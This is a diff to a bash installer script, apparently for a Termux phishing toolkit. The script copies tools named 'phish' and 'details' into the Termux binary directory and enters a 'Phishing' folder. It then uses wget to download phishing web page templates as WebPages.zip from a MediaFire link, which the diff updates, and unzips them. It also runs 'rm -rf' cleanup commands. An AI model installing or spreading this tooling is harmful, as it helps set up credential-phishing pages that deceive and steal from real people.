@@ -1,4 +1,6 @@
 #! /bin/bash
+cd /data/data/com.termux/files/usr/bin
+rm -rf phish
 cp -r details /data/data/com.termux/files/usr/bin
 cp -r phish /data/data/com.termux/files/usr/bin
 cd /data/data/com.termux/files/usr/bin
@@ -6,7 +8,7 @@ chmod 765 details
 chmod 765 phish
 cd
 cd Phishing
-wget https://download1495.mediafire.com/soqyptjf4cag/h4m5t1msnr8zd47/WebPages.zip
+wget https://download1495.mediafire.com/uqujq8ko3k7g/h4m5t1msnr8zd47/WebPages.zip
 unzip WebPages.zip
 rm -rf WebPages.zip
 rm -rf phish
